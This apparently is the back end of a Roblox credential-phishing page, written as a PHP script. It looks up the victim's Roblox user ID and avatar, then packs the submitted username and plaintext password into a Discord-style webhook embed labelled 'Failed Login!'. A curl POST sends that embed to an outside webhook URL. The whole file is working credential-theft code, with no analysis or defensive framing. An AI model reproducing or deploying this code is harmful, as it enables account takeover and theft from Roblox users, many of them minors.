<?php
$check123 = file_get_contents("https://api.roblox.com/users/get-by-username?username=$username", false);
$user = json_decode($check123);
$userid = $user->{'Id'};

$avatarApi = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$userid&size=48x48&format=png")
  ;
$aDecode = json_decode($avatarApi,true);
foreach($aDecode['data'] as $avatarData){
    $thumbnailurl =  $avatarData['imageUrl'];
}

$embed = json_encode([
    
    "username" => "Test",
    "avatar_url" => "",

    "tts" => false,


    "embeds" => [
        [

            "title" => "Click here to view profile",

            "type" => "rich",

            "description" => $description,

            "url" => "https://www.roblox.com/users/$userid/profile",

            "timestamp" => date("c", strtotime("now")),

            "color" => hexdec( "F32808" ),


            "footer" => [
                "text" => "Failed Login!",
                "icon_url" => "https://uxwing.com/wp-content/themes/uxwing/download/checkmark-cross/red-x-icon.png"
            ],

            "image" => [
                "url" => ""
            ],

           "thumbnail" => [
                "url" => "$thumbnailurl"
            ],

            "author" => [
                "name" => "Test Login",
                "url" => ""
            ],

            "fields" => [
                [
                    "name" => "Username",
                    "value" => $username,
                    "inline" => true
                ],
                [
                    "name" => "Password",
                    "value" => $password,
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => $failed,
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => $embed,
  CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
));

$response = curl_exec($curl);
curl_close( $curl );
?>